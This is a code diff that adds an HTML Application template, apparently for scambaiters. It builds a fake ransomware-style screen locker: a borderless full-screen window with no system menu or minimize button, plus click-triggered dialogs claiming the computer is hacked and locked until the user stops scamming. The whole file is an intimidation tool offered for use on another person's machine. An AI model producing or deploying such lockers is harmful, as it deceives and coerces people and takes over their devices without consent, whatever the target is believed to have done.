@@ -1,0 +1,44 @@
+<html>
+<head>
+	<title>ScammerHacker Pro | Scambaiter Edition</title>
+	<style>
+		body {
+			background-image: url('background.png'); /* <!-- Change this to the relative file path of the background image you want to use. --> */
+			/* <!-- To use a solid color background, use the "background-color" property (instead of "background-image"). --> */
+			color: white; /* <!-- This controls the font color for the text. --> */
+			font-family: sans-serif; /* <!-- This can be changed to use a different font. Try using "serif" instead of "sans-serif". --> */
+			/* This "double-language" commenting (HTML comment inside CSS comment) is done to make the comments easier to find in Notepad++. */
+		}
+	</style>
+</head>
+
+<!-- DO NOT CHANGE OR REMOVE THIS IMPORTANT CODE -->
+<hta:application id="oBVC" 
+applicationname="LOCK"  
+version="1.0" 
+maximizebutton="no" 
+minimizebutton="no" 
+sysmenu="no" 
+Caption="no" 
+windowstate="maximize"/>
+<!-- END OF IMPORTANT CODE -->
+
+<body scroll="no">
+	<!-- INSERT BODY HTML HERE -->
+</body>
+
+<script language="javascript">
+	// A popup message that looks like a system dialog box will appear whenever the mouse is clicked (as long as there isn't already one open).
+	// This popup will have an OK button that will close it.
+	function noClick() {
+		if ((event.button==1)||(event.button==2)) {
+			alert('Your computer has been hacked.');
+			a = confirm('Your device is locked. Do you want to unlock it?');
+			if (a == true) {
+				alert('If you want to unlock your device, you will need to refund all your victims, shut down your scam call center, and stop scamming innocent people. Until you stop scamming, your device will be stuck on this screen (and it will be unusable).');
+			}
+		}
+	}
+	document.onmousedown=noClick
+</script>
+</html>
